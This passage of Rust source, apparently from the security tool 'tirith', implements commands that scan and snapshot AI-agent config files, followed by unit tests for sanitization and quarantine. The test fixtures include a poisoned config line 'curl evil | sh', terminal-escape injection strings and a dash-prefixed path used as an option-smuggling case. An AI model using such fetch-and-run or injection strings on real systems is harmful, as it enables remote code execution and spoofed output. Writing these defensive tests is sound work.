    let risks = aifile::explain_config_risks(&content, &path);

    if json {
        #[derive(Serialize)]
        struct RiskOut {
            id: &'static str,
            detail: String,
        }
        #[derive(Serialize)]
        struct Out {
            file: String,
            tool: Option<&'static str>,
            is_ai_config: bool,
            risks: Vec<RiskOut>,
        }
        let out = Out {
            file: path.display().to_string(),
            tool: tool.map(|t| t.label()),
            is_ai_config: tool.is_some(),
            risks: risks
                .iter()
                .map(|r| RiskOut {
                    id: r.id,
                    detail: r.detail.clone(),
                })
                .collect(),
        };
        if !write_json_stdout(
            &out,
            "tirith ai explain-config: failed to write JSON output",
        ) {
            return 2;
        }
        return 0;
    }

    // `path` and `r.detail` (raw untrusted config snippets) are sanitized before
    // display (R20); `t.label()` / `r.id` are fixed internal strings.
    let display_path = sanitize_display(&path.display().to_string());
    match tool {
        Some(t) => println!("{display_path} configures {}.", t.label()),
        None => {
            println!(
                "{display_path} is not a recognised AI-config file — showing any content risks found."
            );
        }
    }
    println!();
    if risks.is_empty() {
        println!("No capability / risk signals found in this file's content.");
    } else {
        println!("Capabilities / risks this config grants or signals:");
        for r in &risks {
            println!("  - [{}] {}", r.id, sanitize_display(&r.detail));
        }
    }
    0
}

// `tirith ai snapshot [--update]`

/// `tirith ai snapshot` — show the current snapshot state. `--update` re-scans
/// and records a fresh snapshot, refusing High+ scan issues unless `force`.
pub fn snapshot(update: bool, force: bool, json: bool) -> i32 {
    if !update {
        return snapshot_status(json);
    }
    snapshot_update(force, json)
}

/// Show the current snapshot's metadata without modifying it.
fn snapshot_status(json: bool) -> i32 {
    let root = repo_root();
    let path_str = snapshot_path(&root)
        .map(|p| p.display().to_string())
        .unwrap_or_else(|| "<unresolved>".to_string());

    let snap = match load_snapshot(&root) {
        Ok(s) => s,
        Err(e) => {
            if !emit_error(json, "tirith ai snapshot", &e.to_string()) {
                return 2;
            }
            return 1;
        }
    };

    if json {
        let v = match &snap {
            Some(s) => serde_json::json!({
                "exists": true,
                "path": path_str,
                "updated_at": s.updated_at,
                "root": s.root,
                "file_count": s.files.len(),
            }),
            None => serde_json::json!({
                "exists": false,
                "path": path_str,
                "hint": "run `tirith ai snapshot --update` to record the current state",
            }),
        };
        if !write_json_stdout(&v, "tirith ai snapshot: failed to write JSON output") {
            return 2;
        }
        return 0;
    }

    match snap {
        Some(s) => {
            // `root` is read back from the on-disk snapshot; sanitize like the
            // other AI-derived fields.
            println!("AI-config snapshot:");
            println!("  path:       {path_str}");
            println!("  recorded:   {}", s.updated_at);
            println!("  root:       {}", sanitize_display(&s.root));
            println!("  files:      {}", s.files.len());
            println!();
            println!("Compare the current tree against it with `tirith ai diff`.");
        }
        None => {
            println!("No AI-config snapshot recorded yet.");
            println!("  path: {path_str}");
            println!();
            println!("Record the current (trusted) state with:");
            println!("  tirith ai snapshot --update");
        }
    }
    0
}

/// Exit-code policy for an un-scannable file during `snapshot --update`
/// (CodeRabbit M13 PR #132 R7-3): a `None` scan is never recorded and aborts the
/// update non-zero (2 on a failed `--json` write, else 1).
fn snapshot_scan_failed_code(json: bool, file: &Path) -> i32 {
    if !emit_error(
        json,
        "tirith ai snapshot",
        &format!(
            "failed to scan {}: file could not be analyzed",
            file.display()
        ),
    ) {
        return 2;
    }
    1
}

/// Re-scan the AI-config files and record a fresh snapshot.
fn snapshot_update(force: bool, json: bool) -> i32 {
    let root = repo_root();
    let files = tirith_core::scan::collect_ai_config_files(&root);

    // Refuse to bless a compromised state: scan each file and abort on any High+
    // finding (unless --force), reusing `scan_single_file` — no new detection.
    let mut blocking: Vec<(String, Severity, String)> = Vec::new();
    let mut entries: BTreeMap<String, SnapshotEntry> = BTreeMap::new();
    for f in &files {
        // R3-8 (CodeRabbit M13 PR #132): make read-scan-record single-read-safe.
        // `scan_single_file` does its own fresh read, so a concurrent edit could
        // validate one version while we record another. Since it can't take
        // already-read bytes, we bracket the scan with a hash on each side
        // (pre/post) and ABORT on any change rather than bless an unvalidated
        // baseline.
        let content = match read_text(f) {
            Ok(c) => c,
            Err(e) => {
                if !emit_error(
                    json,
                    "tirith ai snapshot",
                    &format!("cannot read {}: {e}", f.display()),
                ) {
                    return 2;
                }
                return 1;
            }
        };
        let pre_hash = tirith_core::clipboard::content_sha256_hex(content.as_bytes());

        // A `None` scan is a HARD failure, not a silent skip (CodeRabbit M13 PR
        // #132 R7-3): recording an un-scanned file would bless un-assessed risk.
        // Abort the whole update rather than record a half-validated set.
        let result = match tirith_core::scan::scan_single_file(f) {
            Some(r) => r,
            None => return snapshot_scan_failed_code(json, f),
        };
        for finding in &result.findings {
            if finding.severity >= Severity::High {
                blocking.push((
                    rel_key(&root, f),
                    finding.severity,
                    finding.rule_id.to_string(),
                ));
            }
        }

        // Re-read and re-hash AFTER scanning; if changed, the scan no longer
        // describes what we would record — abort.
        let post = match read_text(f) {
            Ok(c) => c,
            Err(e) => {
                if !emit_error(
                    json,
                    "tirith ai snapshot",
                    &format!("cannot re-read {}: {e}", f.display()),
                ) {
                    return 2;
                }
                return 1;
            }
        };
        let post_hash = tirith_core::clipboard::content_sha256_hex(post.as_bytes());
        if pre_hash != post_hash {
            if !emit_error(
                json,
                "tirith ai snapshot",
                &format!(
                    "{} changed while it was being scanned; refusing to record a baseline that \
                     was not validated. Re-run `tirith ai snapshot --update`.",
                    f.display()
                ),
            ) {
                return 2;
            }
            return 1;
        }

        entries.insert(
            rel_key(&root, f),
            SnapshotEntry {
                sha256: pre_hash,
                content,
            },
        );
    }

    if !blocking.is_empty() && !force {
        let msg = format!(
            "refusing to snapshot: {} High+ issue(s) in the AI-config files — blessing this \
             state would record a possibly-compromised baseline. Resolve them, or re-run with \
             --force to snapshot anyway.",
            blocking.len()
        );
        if json {
            #[derive(Serialize)]
            struct Blocking {
                path: String,
                severity: String,
                rule: String,
            }
            let v = serde_json::json!({
                "error": msg,
                "blocking_findings": blocking
                    .iter()
                    .map(|(p, s, r)| Blocking { path: p.clone(), severity: s.to_string(), rule: r.clone() })
                    .collect::<Vec<_>>(),
            });
            if !write_json_stdout(&v, "tirith ai snapshot: failed to write JSON output") {
                return 2;
            }
        } else {
            eprintln!("tirith ai snapshot: {msg}");
            for (p, s, r) in &blocking {
                // `p` is a repo-derived path (attacker-controlled basename);
                // sanitize it. `s`/`r` are tirith-internal enums, printed as-is.
                eprintln!("  - {}: {r} ({s})", sanitize_display(p));
            }
        }
        return 1;
    }

    let snap = Snapshot {
        updated_at: chrono::Utc::now().to_rfc3339(),
        root: root.display().to_string(),
        files: entries,
    };

    let Some(path) = snapshot_path(&root) else {
        if !emit_error(
            json,
            "tirith ai snapshot",
            "cannot determine tirith state directory",
        ) {
            return 2;
        }
        return 1;
    };
    // Ensure the state dir exists, then write atomically.
    if let Some(parent) = path.parent() {
        if let Err(e) = std::fs::create_dir_all(parent) {
            if !emit_error(
                json,
                "tirith ai snapshot",
                &format!("cannot create state dir {}: {e}", parent.display()),
            ) {
                return 2;
            }
            return 1;
        }
    }
    let bytes = match serde_json::to_vec_pretty(&snap) {
        Ok(b) => b,
        Err(e) => {
            if !emit_error(
                json,
                "tirith ai snapshot",
                &format!("serialize failed: {e}"),
            ) {
                return 2;
            }
            return 1;
        }
    };
    if let Err(e) = write_file_atomic(&path, &bytes, true) {
        if !emit_error(
            json,
            "tirith ai snapshot",
            &format!("failed to write snapshot {}: {e}", path.display()),
        ) {
            return 2;
        }
        return 1;
    }

    if json {
        let v = serde_json::json!({
            "updated": true,
            "path": path.display().to_string(),
            "updated_at": snap.updated_at,
            "root": snap.root,
            "file_count": snap.files.len(),
            "forced_over_findings": !blocking.is_empty(),
        });
        if !write_json_stdout(&v, "tirith ai snapshot: failed to write JSON output") {
            return 2;
        }
        return 0;
    }

    println!("Recorded AI-config snapshot ({} files).", snap.files.len());
    println!("  path:     {}", path.display());
    println!("  recorded: {}", snap.updated_at);
    if !blocking.is_empty() {
        println!();
        println!("WARNING: --force recorded a snapshot despite {} High+ issue(s); the baseline may be compromised.", blocking.len());
    }
    0
}

#[cfg(test)]
mod tests {
    use super::*;

    // CodeRabbit M13 PR #132 R20: `sanitize_display` must strip raw terminal-
    // control bytes (CSI/OSC) while keeping visible text, so a hostile config
    // can't spoof terminal output.
    #[test]
    fn sanitize_display_strips_terminal_escapes() {
        let hostile = "\x1b[31mFAKE ALERT\x1b[0m drop tables";
        let safe = sanitize_display(hostile);
        assert!(
            !safe.contains('\u{1b}'),
            "sanitized output must contain no raw ESC byte, got: {safe:?}"
        );
        // The CSI sequences are gone but the payload remains.
        assert!(
            safe.contains("FAKE ALERT") && safe.contains("drop tables"),
            "visible text must survive sanitization, got: {safe:?}"
        );
        assert!(
            !safe.contains("[31m") && !safe.contains("[0m"),
            "the CSI bodies must be consumed with the ESC, got: {safe:?}"
        );

        // A bare OSC sequence is also fully removed (ESC, `]…`, BEL terminator).
        let osc = "before\x1b]0;pwned\x07after";
        let safe_osc = sanitize_display(osc);
        assert!(
            !safe_osc.contains('\u{1b}') && !safe_osc.contains('\u{7}'),
            "OSC escape + BEL terminator must be stripped, got: {safe_osc:?}"
        );
        assert!(
            safe_osc.contains("before") && safe_osc.contains("after"),
            "text around the OSC sequence must survive, got: {safe_osc:?}"
        );

        // Kept newlines/tabs are flattened to spaces (one display field, one line).
        let multiline = "line1\nline2\tcol";
        assert_eq!(sanitize_display(multiline), "line1 line2 col");
    }

    // CodeRabbit M13 PR #132 R28 (F1): `emit_error`'s human branch sanitizes BOTH
    // `ctx` and `msg` (which embed AI-config-derived content) before `eprintln!`.
    // Pin the composed string carries no raw ESC while visible text survives.
    // (The JSON path is left raw on purpose — JSON encodes it safely.)
    #[test]
    fn emit_error_human_line_is_sanitized() {
        let ctx = "tirith ai \x1b[31msnapshot\x1b[0m";
        let msg = "cannot re-read \x1b]0;pwned\x07/repo/\x1b[2Jevil.md: oops";
        // Reproduce exactly what the human branch builds.
        let line = format!("{}: {}", sanitize_display(ctx), sanitize_display(msg));
        assert!(
            !line.contains('\u{1b}') && !line.contains('\u{7}'),
            "composed emit_error human line must contain no raw ESC/BEL byte, got: {line:?}"
        );
        // The human-readable parts survive.
        assert!(
            line.contains("snapshot")
                && line.contains("cannot re-read")
                && line.contains("evil.md")
                && line.contains("oops"),
            "visible diagnostic text must survive sanitization, got: {line:?}"
        );
    }

    // CodeRabbit M13 PR #132 R28 (F2): the blocking-snapshot summary loop
    // sanitizes the repo-derived path (`rule`/`severity` are internal enums).
    // Pin the per-row seam carries no raw ESC while path/rule/severity survive.
    #[test]
    fn blocking_snapshot_row_path_is_sanitized() {
        let p = ".claude/\x1b[31mhooks\x1b[0m/\x1b]0;pwn\x07evil.sh".to_string();
        let s = Severity::High;
        let r = "agent_instruction_hidden".to_string();
        // Reproduce exactly what the loop builds.
        let row = format!("  - {}: {r} ({s})", sanitize_display(&p));
        assert!(
            !row.contains('\u{1b}') && !row.contains('\u{7}'),
            "blocking row must contain no raw ESC/BEL byte, got: {row:?}"
        );
        // The path's visible text plus the internal rule/severity all survive.
        assert!(
            row.contains("hooks")
                && row.contains("evil.sh")
                && row.contains("agent_instruction_hidden"),
            "visible path text, rule, and severity must survive, got: {row:?}"
        );
    }

    // CodeRabbit M13 PR #132 R20: cargo runs tests with stdin/stderr piped, so
    // `confirmation_possible` must report `false` — the non-interactive case that
    // routes `--move` (without `--yes`) to emit_error + exit 2, not a silent "no".
    #[test]
    fn confirmation_impossible_without_a_tty() {
        assert!(
            !confirmation_possible(),
            "with stdin/stderr piped (the cargo-test default, no TTY), an interactive \
             confirmation must be reported impossible so the no-TTY branch fails non-zero"
        );
    }

    // CodeRabbit M13 round-2 R7 / R15-ai.rs:780: the restore hint is OS-aware and
    // includes a literal `--` so a dash-prefixed path can't parse as a `cp` option.
    #[cfg(not(windows))]
    #[test]
    fn restore_command_unix_uses_cp_with_posix_quoting() {
        // Plain paths: `cp -- <from> <to>`.
        let cmd = restore_command(Path::new("/q/copy.txt"), Path::new("/orig/secret.txt"));
        assert_eq!(cmd, "cp -- /q/copy.txt /orig/secret.txt");

        // A space forces single-quoting; the restore copies FROM the quarantine
        // copy TO the original (argument order matters).
        let cmd = restore_command(Path::new("/q/a b.txt"), Path::new("/orig/my notes.txt"));
        assert_eq!(cmd, "cp -- '/q/a b.txt' '/orig/my notes.txt'");

        // An embedded single quote round-trips as `'\''` (POSIX), not `''`.
        let cmd = restore_command(Path::new("/q/it's.txt"), Path::new("/orig/x.txt"));
        assert_eq!(cmd, r#"cp -- '/q/it'\''s.txt' /orig/x.txt"#);

        // Never emits PowerShell on Unix.
        assert!(!cmd.contains("Copy-Item"));
    }

    // R15-ai.rs:780: a dash-prefixed destination (the attack the `--` guards
    // against) must remain an operand, not become a `cp` option. The command
    // must contain the literal `cp -- ` separator.
    #[cfg(not(windows))]
    #[test]
    fn restore_command_unix_uses_double_dash_before_operands() {
        // A leading-dash path is exactly the case `--` protects: `shell_quote`
        // leaves it bare, so without `--` it would parse as an option.
        let cmd = restore_command(Path::new("/q/copy.txt"), Path::new("-backup/.cursorrules"));
        assert!(
            cmd.contains("cp -- "),
            "restore command must use `cp -- ` so a dash-prefixed path is not an option: {cmd:?}"
        );
        // The dash-prefixed operand survives verbatim after the separator (it is
        // shell-safe per `shell_quote`, so it stays bare — but now post-`--`).
        assert!(
            cmd.ends_with(" -backup/.cursorrules"),
            "the dash-prefixed destination must remain an operand: {cmd:?}"
        );
    }

    #[cfg(windows)]
    #[test]
    fn restore_command_windows_uses_copy_item_literalpath() {
        let cmd = restore_command(
            Path::new(r"C:\q\copy.txt"),
            Path::new(r"C:\orig\secret.txt"),
        );
        assert_eq!(
            cmd,
            r"Copy-Item -LiteralPath 'C:\q\copy.txt' -Destination 'C:\orig\secret.txt'"
        );
        // Backslashes are literal inside PowerShell single quotes (no escaping);
        // never emits a POSIX `cp` on Windows.
        assert!(!cmd.starts_with("cp "));

        // An embedded single quote is DOUBLED for PowerShell (`'` → `''`).
        let cmd = restore_command(Path::new(r"C:\q\it's.txt"), Path::new(r"C:\orig\x.txt"));
        assert_eq!(
            cmd,
            r"Copy-Item -LiteralPath 'C:\q\it''s.txt' -Destination 'C:\orig\x.txt'"
        );
    }

    // CodeRabbit M13 round-4 N2: the display diff is count-based, so a line that
    // appears more often on one side than the other is reported by the surplus,
    // not collapsed to one (or dropped) the way a HashSet diff would.
    #[test]
    fn added_removed_reports_count_surplus() {
        // A single `a` becomes two `a`s → exactly one added `a`, nothing removed.
        let (added, removed) = added_removed("a", "a\na");
        assert_eq!(added, vec!["a".to_string()]);
        assert!(removed.is_empty());

        // Symmetric: two `a`s become one → exactly one removed `a`.
        let (added, removed) = added_removed("a\na", "a");
        assert!(added.is_empty());
        assert_eq!(removed, vec!["a".to_string()]);

        // No churn when the multiset is unchanged (whitespace-only differs are
        // normalized away by trim_end + empty-line filtering).
        let (added, removed) = added_removed("a\nb", "a  \nb\n");
        assert!(added.is_empty());
        assert!(removed.is_empty());
    }

    // CodeRabbit M13 round-5 D5-3: `read_text` must enforce its 10 MiB cap
    // through a `take`-bounded read, not a TOCTOU stat-then-read. The cap is the
    // load-bearing security property, so assert the boundary directly: a file
    // exactly at the cap reads, a file one byte over is rejected as InvalidData
    // with the documented message, and the buffer can never exceed the cap.
    const READ_TEXT_MAX_BYTES: usize = 10 * 1024 * 1024;

    #[test]
    fn read_text_accepts_file_at_cap() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("at_cap.txt");
        std::fs::write(&path, vec![b'a'; READ_TEXT_MAX_BYTES]).expect("write");
        let s = read_text(&path).expect("a file exactly at the cap must be accepted");
        assert_eq!(s.len(), READ_TEXT_MAX_BYTES);
    }

    #[test]
    fn read_text_rejects_file_over_cap() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("over_cap.txt");
        // One byte past the cap must be rejected — and crucially, only
        // MAX_BYTES + 1 bytes are ever read into memory regardless of how large
        // the file actually is.
        std::fs::write(&path, vec![b'a'; READ_TEXT_MAX_BYTES + 1]).expect("write");
        let err = read_text(&path).expect_err("a file over the cap must be rejected");
        assert_eq!(err.kind(), std::io::ErrorKind::InvalidData);
        assert!(
            err.to_string().contains("larger than 10 MiB"),
            "error must keep the documented message; got: {err}"
        );
    }

    #[test]
    fn read_text_reads_small_file_verbatim() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("small.txt");
        std::fs::write(&path, "hello\nworld\n").expect("write");
        assert_eq!(read_text(&path).expect("read"), "hello\nworld\n");
    }

    // CodeRabbit M13 PR #132 R7-3: a `None` scan during `snapshot --update` is a
    // HARD failure — the file is never recorded and the update aborts non-zero.
    //
    // Forcing `scan_single_file` to return `None` *after* the preceding
    // `read_text` already succeeded is a genuine TOCTOU race (both read the same
    // bytes), so it can't be triggered deterministically from a fixture. Instead
    // we pin the load-bearing decision directly: the abort path returns a
    // non-zero exit following the surrounding `emit_error` convention (1 in human
    // mode, where the stderr write always succeeds; 2 is reserved for a failed
    // `--json` stdout write / broken pipe). The `match … { None => return … }`
    // arm in `snapshot_update` routes through this helper, so a non-zero return
    // here is exactly "abort the update, record nothing".
    #[test]
    fn snapshot_scan_failed_aborts_nonzero_human_mode() {
        let code = snapshot_scan_failed_code(false, Path::new("/repo/.cursorrules"));
        assert_eq!(
            code, 1,
            "an un-scannable file must abort `snapshot --update` with a non-zero exit"
        );
        assert_ne!(code, 0, "a None scan must never be treated as success");
    }

    use crate::cli::test_harness::{EnvGuard, ENV_LOCK};

    /// RAII guard pointing `XDG_CACHE_HOME` at `dir` (failure-safe restore) so the
    /// quarantine store resolves into an isolated temp dir. Holds the SINGLE
    /// crate-wide `ENV_LOCK` (not a module-local one) so this process-global
    /// mutation can't race other env-mutating tests sharing the same global
    /// (M13 PR #132 cross-lock-domain race class).
    struct CacheHomeGuard {
        _xdg: EnvGuard,
        _lock: std::sync::MutexGuard<'static, ()>,
    }

    impl CacheHomeGuard {
        fn set(dir: &Path) -> Self {
            let lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
            let xdg = EnvGuard::set("XDG_CACHE_HOME", dir);
            Self {
                _xdg: xdg,
                _lock: lock,
            }
        }
    }

    /// R15-ai.rs:516: a stable file quarantined via `--move --yes` must report a
    /// sha matching the bytes at `dest`, and the filename must encode that hash.
    #[cfg(unix)]
    #[test]
    fn quarantine_move_reports_sha_matching_dest_bytes() {
        let cache = tempfile::tempdir().expect("cache home");
        let work = tempfile::tempdir().expect("work dir");
        let src = work.path().join(".cursorrules");
        let body = b"# stable ai-config\nallow everything\n";
        std::fs::write(&src, body).expect("write src");
        let expected_sha = tirith_core::clipboard::content_sha256_hex(body);

        let _guard = CacheHomeGuard::set(cache.path());
        // `--move --yes` short-circuits the confirm prompt, so no TTY is needed.
        let code = quarantine(
            src.to_str().unwrap(),
            /*do_move*/ true,
            /*yes*/ true,
            false,
        );
        assert_eq!(code, 0, "a stable --move --yes quarantine must succeed");

        // The original is gone (it was MOVED).
        assert!(!src.exists(), "the original must be removed after --move");

        // Locate the single quarantined file in the store and verify its bytes +
        // the hash encoded in its filename both equal the sha of the moved bytes.
        let qdir = cache.path().join("tirith").join("quarantine");
        let entries: Vec<PathBuf> = std::fs::read_dir(&qdir)
            .expect("quarantine dir exists")
            .flatten()
            .map(|e| e.path())
            .collect();
        assert_eq!(
            entries.len(),
            1,
            "exactly one quarantined file, got: {entries:?}"
        );
        let dest = &entries[0];

        // The emitted/encoded sha must match the bytes physically at `dest`.
        let dest_bytes = std::fs::read(dest).expect("read quarantined file");
        let dest_sha = tirith_core::clipboard::content_sha256_hex(&dest_bytes);
        assert_eq!(
            dest_sha, expected_sha,
            "the bytes at dest must hash to the expected sha"
        );

        // The filename encodes `<ts>-<short_sha>-<basename>`; the short hash must
        // be the 16-char prefix of the dest bytes' sha.
        let fname = dest.file_name().unwrap().to_string_lossy();
        let short = &expected_sha[..expected_sha.len().min(16)];
        assert!(
            fname.contains(short),
            "quarantine filename {fname:?} must encode the dest-bytes short hash {short:?}"
        );
        assert!(
            fname.ends_with(".cursorrules"),
            "quarantine filename {fname:?} must keep the basename"
        );
    }

    // CodeRabbit M13 PR #132 R22 (evidence loss): `unique_dest` must never return
    // an existing path, walking a `-1`, `-2`, … suffix to a free slot — the
    // deterministic core of the no-clobber guarantee.
    #[test]
    fn unique_dest_walks_numeric_suffix_past_existing_files() {
        let dir = tempfile::tempdir().expect("tempdir");
        let base = "20260101T000000Z-deadbeefdeadbeef-.cursorrules";

        // No collision: the un-suffixed base is used verbatim.
        assert_eq!(unique_dest(dir.path(), base), dir.path().join(base));

        // Occupy the base name → next free slot is `<base>-1`.
        std::fs::write(dir.path().join(base), b"first").expect("write base");
        assert_eq!(
            unique_dest(dir.path(), base),
            dir.path().join(format!("{base}-1")),
            "with the base taken, the first free slot is `<base>-1`"
        );

        // Occupy `<base>-1` too → it must skip to `<base>-2`.
        std::fs::write(dir.path().join(format!("{base}-1")), b"second").expect("write -1");
        assert_eq!(
            unique_dest(dir.path(), base),
            dir.path().join(format!("{base}-2")),
            "with base and `-1` taken, the next free slot is `<base>-2`"
        );
    }

    // CodeRabbit M13 PR #132 R25 (TOCTOU): `reserve_dest` must ATOMICALLY claim a
    // free slot — skipping occupied names AND creating the placeholder it returns
    // (so the `rename` replaces a path we own). Core of the no-clobber-on-move guarantee.
    #[test]
    fn reserve_dest_atomically_claims_a_free_slot() {
        let dir = tempfile::tempdir().expect("tempdir");
        let base = "20260101T000000Z-deadbeefdeadbeef-.cursorrules";

        // First reservation takes the base and CREATES it (the placeholder must
        // exist — that is what makes the claim atomic, not advisory).
        let r0 = reserve_dest(dir.path(), base).expect("first reserve");
        assert_eq!(r0, dir.path().join(base));
        assert!(
            r0.exists(),
            "reserve_dest must create the placeholder it returns, got missing: {r0:?}"
        );

        // The base is now occupied, so the next reservation skips to `<base>-1`.
        let r1 = reserve_dest(dir.path(), base).expect("second reserve");
        assert_eq!(
            r1,
            dir.path().join(format!("{base}-1")),
            "with the base reserved, the next slot must be `<base>-1`"
        );
        assert_ne!(r0, r1, "two reservations must yield distinct paths");
        assert!(r1.exists(), "the second placeholder must also be created");
    }

    // CodeRabbit M13 PR #132 R25 (TOCTOU evidence loss on `--move`): a `--move`
    // whose computed destination ALREADY EXISTS must NOT clobber it. Pre-seed a
    // SENTINEL (distinct bytes) at the computed base path, move a real source, and
    // assert the moved file lands at a distinct path with the sentinel intact.
    #[cfg(unix)]
    #[test]
    fn quarantine_move_does_not_clobber_existing_dest() {
        let cache = tempfile::tempdir().expect("cache home");
        let work = tempfile::tempdir().expect("work dir");
        let src = work.path().join(".cursorrules");
        let body = b"# real config being moved\nrun: ./build.sh\n";
        std::fs::write(&src, body).expect("write src");

        let _guard = CacheHomeGuard::set(cache.path());

        // Reconstruct the destination base name EXACTLY as `quarantine` derives it.
        // `ts` (one-second granularity) matches in practice; the durable assertions
        // hold even across a second boundary.
        let qdir = cache.path().join("tirith").join("quarantine");
        create_quarantine_dir(&qdir).expect("create qdir");
        let sha = tirith_core::clipboard::content_sha256_hex(body);
        let short_sha = &sha[..sha.len().min(16)];
        let ts = chrono::Utc::now().format("%Y%m%dT%H%M%SZ").to_string();
        let base = format!("{ts}-{short_sha}-.cursorrules");

        // Pre-seed a SENTINEL with DIFFERENT bytes at the computed base path.
        let sentinel = qdir.join(&base);
        let sentinel_bytes = b"PRE-EXISTING QUARANTINE EVIDENCE - MUST NOT BE CLOBBERED";
        std::fs::write(&sentinel, sentinel_bytes).expect("seed sentinel");

        // Move the real source. `--move --yes` skips the confirm prompt.
        let code = quarantine(
            src.to_str().unwrap(),
            /*do_move*/ true,
            /*yes*/ true,
            true,
        );
        assert_eq!(
            code, 0,
            "the --move must still succeed (landing at a fresh slot)"
        );

        // The original was moved away.
        assert!(!src.exists(), "the source must be removed after --move");

        // The sentinel's bytes are INTACT — the move did not overwrite it.
        assert_eq!(
            std::fs::read(&sentinel).expect("sentinel still exists"),
            sentinel_bytes,
            "the pre-existing quarantine file must NOT be clobbered by --move"
        );

        // Two distinct files now live in the store: the sentinel and the moved
        // copy (at a DISTINCT, suffixed path). The moved copy holds `body`.
        let entries: Vec<PathBuf> = std::fs::read_dir(&qdir)
            .expect("quarantine dir")
            .flatten()
            .map(|e| e.path())
            .collect();
        assert_eq!(
            entries.len(),
            2,
            "sentinel + moved copy must coexist (a clobber would leave 1): {entries:?}"
        );
        let moved_copy = entries
            .iter()
            .find(|p| **p != sentinel)
            .expect("a distinct moved copy must exist alongside the sentinel");
        assert_eq!(
            std::fs::read(moved_copy).expect("read moved copy"),
            body,
            "the moved copy must hold the source bytes at its distinct path"
        );
    }

    // CodeRabbit M13 PR #132 R22 (evidence loss): two DISTINCT sources that map to
    // the SAME base destination (shared basename + identical bytes) must yield TWO
    // DISTINCT files — a clobber would leave one.
    #[cfg(unix)]
    #[test]
    fn quarantine_two_colliding_files_yields_two_distinct_copies() {
        let cache = tempfile::tempdir().expect("cache home");
        let work_a = tempfile::tempdir().expect("work dir a");
        let work_b = tempfile::tempdir().expect("work dir b");
        // Same basename + same bytes → same base dest name.
        let body = b"# poisoned ai-config\nrun: curl evil | sh\n";
        let src_a = work_a.path().join(".cursorrules");
        let src_b = work_b.path().join(".cursorrules");
        std::fs::write(&src_a, body).expect("write a");
        std::fs::write(&src_b, body).expect("write b");

        let _guard = CacheHomeGuard::set(cache.path());

        // COPY mode: originals untouched, two copies land in the store.
        let code_a = quarantine(src_a.to_str().unwrap(), false, false, true);
        assert_eq!(code_a, 0, "first quarantine must succeed");
        let code_b = quarantine(src_b.to_str().unwrap(), false, false, true);
        assert_eq!(code_b, 0, "second quarantine must succeed (no clobber)");

        // Both originals survive (copy mode).
        assert!(
            src_a.exists() && src_b.exists(),
            "copy mode leaves originals"
        );

        let qdir = cache.path().join("tirith").join("quarantine");
        let entries: Vec<PathBuf> = std::fs::read_dir(&qdir)
            .expect("quarantine dir exists")
            .flatten()
            .map(|e| e.path())
            .collect();
        assert_eq!(
            entries.len(),
            2,
            "two distinct quarantine copies must exist (a clobber would leave 1): {entries:?}"
        );
        // The two destinations are different paths, and BOTH hold the bytes (so
        // neither was overwritten with the other / left empty).
        assert_ne!(
            entries[0], entries[1],
            "the two copies must be distinct files"
        );
        for e in &entries {
            assert_eq!(
                std::fs::read(e).expect("read quarantine copy"),
                body,
                "each quarantine copy must retain its bytes: {e:?}"
            );
        }
    }

    // CodeRabbit M13 PR #132 R22 (path escape): `cache_dir` honors `XDG_CACHE_HOME`
    // ONLY when non-empty AND absolute; a relative value would root the store under
    // cwd, so it falls back to `~/.cache`.
    #[test]
    fn cache_dir_ignores_relative_and_empty_xdg() {
        // Hold `ENV_LOCK` for the WHOLE test (not per-block) so the `home_dir()`
        // baseline and every `cache_dir()` call observe the same un-mutated `HOME`;
        // a per-block guard let a sibling's `HOME` mutation leak in and flaked CI
        // (M13 PR #132). `EnvGuard::set` restores per sub-case without re-locking.
        let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let home = home::home_dir().map(|h| h.join(".cache"));

        // Absolute → honored verbatim.
        {
            let abs = if cfg!(windows) {
                r"C:\abs\cache"
            } else {
                "/abs/cache"
            };
            let _x = EnvGuard::set("XDG_CACHE_HOME", Path::new(abs));
            assert_eq!(
                cache_dir(),
                Some(PathBuf::from(abs)),
                "an absolute XDG_CACHE_HOME must be honored"
            );
        }

        // Relative ("cache") → ignored, falls back to ~/.cache.
        {
            let _x = EnvGuard::set("XDG_CACHE_HOME", Path::new("cache"));
            assert_eq!(
                cache_dir(),
                home.clone(),
                "a relative XDG_CACHE_HOME must be ignored (fall back to ~/.cache)"
            );
        }

        // Relative (".") → ignored too.
        {
            let _x = EnvGuard::set("XDG_CACHE_HOME", Path::new("."));
            assert_eq!(
                cache_dir(),
                home.clone(),
                "XDG_CACHE_HOME=\".\" must be ignored"
            );
        }

        // Empty → ignored (the original guard, preserved).
        {
            let _x = EnvGuard::set("XDG_CACHE_HOME", Path::new(""));
            assert_eq!(
                cache_dir(),
                home.clone(),
                "an empty XDG_CACHE_HOME must be ignored"
            );
        }
    }

    // CodeRabbit M13 PR #132 R26 (path escape, round-25 follow-up): the `cache_dir`
    // fallback must ALSO reject a non-absolute home base — `home::home_dir()` reads
    // `$HOME` verbatim on Unix, so a relative `HOME` would root the store under cwd.
    // After the absolute filter the result is None or absolute, never relative.
    #[test]
    fn cache_dir_fallback_rejects_relative_home() {
        // Hold the crate-wide `ENV_LOCK` so these HOME/XDG/USERPROFILE mutations
        // can't interleave with any other env-mutating test (M13 PR #132).
        let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());

        // Mutate inside an inner scope so the `EnvGuard`s restore BEFORE the
        // assertions run (a failing assert can't leak the relative env).
        let resolved = {
            let _xdg = EnvGuard::remove("XDG_CACHE_HOME");
            let _home = EnvGuard::set("HOME", Path::new("relative-home"));
            let _userprofile = EnvGuard::set("USERPROFILE", Path::new("relative-home"));
            cache_dir()
        };

        // Must not echo back a cwd-relative cache base from the relative HOME...
        assert_ne!(
            resolved.as_deref(),
            Some(Path::new("relative-home").join(".cache").as_path()),
            "cache_dir must not build its fallback from a relative HOME"
        );
        // ...and whatever it returns must be absolute (or absent), never relative.
        if let Some(p) = &resolved {
            assert!(
                p.is_absolute(),
                "cache_dir fallback must be absolute, got {p:?}"
            );
        }
    }

    // CodeRabbit M13 PR #132 R22 (terminal injection, round-20 follow-up): the
    // PRINTED restore hint runs through `sanitize_display` — shell-quoting does NOT
    // strip ANSI escapes, so the printed form must drop the raw ESC.
    #[test]
    fn printed_restore_command_strips_terminal_escapes() {
        let from = PathBuf::from("/q/\x1b[31mevil\x1b[0m.cursorrules");
